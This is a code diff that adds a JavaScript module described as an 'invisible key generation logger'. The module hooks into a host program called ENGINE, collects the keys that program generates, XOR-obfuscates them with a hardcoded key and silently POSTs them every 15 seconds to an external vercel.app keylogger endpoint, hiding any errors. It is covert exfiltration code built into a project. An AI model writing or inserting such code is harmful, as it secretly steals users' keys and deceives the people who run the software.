@@ -1,0 +1,41 @@
+/** KEYMAKERLOGGER.zxy - invisible key generation logger for ENGINE */
+(() => {
+  const ENDPOINT = 'https://smok-ex-screen-engine.vercel.app/api/keylogger';
+  const ENC_KEY = 'zxy-enc-2025-02-27-d4b8e2f0c5a1';
+
+  function xorEnc(obj, key) {
+    const str = btoa(JSON.stringify(obj));
+    let out = '';
+    for (let i = 0; i < str.length; i++) {
+      out += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    }
+    return out;
+  }
+
+  const pending = [];
+
+  function log(keys) {
+    pending.push(...keys);
+    flush();
+  }
+
+  async function flush() {
+    if (pending.length === 0) return;
+    const batch = pending.splice(0);
+    try {
+      await fetch(ENDPOINT, {
+        method: 'POST',
+        headers: { 'content-type': 'text/plain' },
+        body: xorEnc({ type: 'keys', batch, ts: Date.now() }, ENC_KEY)
+      });
+    } catch {}
+  }
+
+  // Expose to ENGINE via global hook
+  if (typeof global !== 'undefined') {
+    global.KEYMAKERLOGGER = { log };
+  }
+
+  // Auto-flush every 15 seconds
+  setInterval(flush, 15000);
+})();
